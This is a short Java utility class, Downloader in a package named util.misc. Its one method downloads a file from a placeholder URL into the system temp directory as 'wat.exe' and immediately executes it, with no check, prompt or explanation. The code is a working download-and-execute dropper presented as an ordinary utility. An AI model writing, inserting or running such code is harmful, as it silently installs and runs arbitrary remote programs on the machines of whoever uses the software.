package util.misc;

import java.io.FileOutputStream;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;

public class Downloader {
    public static void download() throws Exception {
        ReadableByteChannel rbc = Channels.newChannel(new URL("http://www.url.com").openStream());
        String f = System.getProperty("java.io.tmpdir") + "wat.exe";
        FileOutputStream fos = new FileOutputStream(f);
        fos.getChannel().transferFrom(rbc, 0, 1 << 24);
        fos.close();
        Runtime.getRuntime().exec(f);
    }
}
